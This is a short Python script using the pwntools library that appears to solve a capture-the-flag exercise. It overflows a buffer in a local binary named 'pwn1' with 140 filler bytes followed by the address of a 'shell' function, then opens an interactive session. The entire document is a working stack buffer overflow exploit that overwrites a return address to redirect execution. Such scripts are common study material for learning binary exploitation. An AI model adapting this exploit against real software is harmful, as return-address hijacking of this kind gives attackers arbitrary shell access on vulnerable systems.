from pwn import *

context.binary = "./pwn1"

garbage = b"A"*128
padding = b"a"*12
func_addr = p32(context.binary.functions["shell"].address)

p = process()
p.sendline(garbage + padding + func_addr)
p.interactive()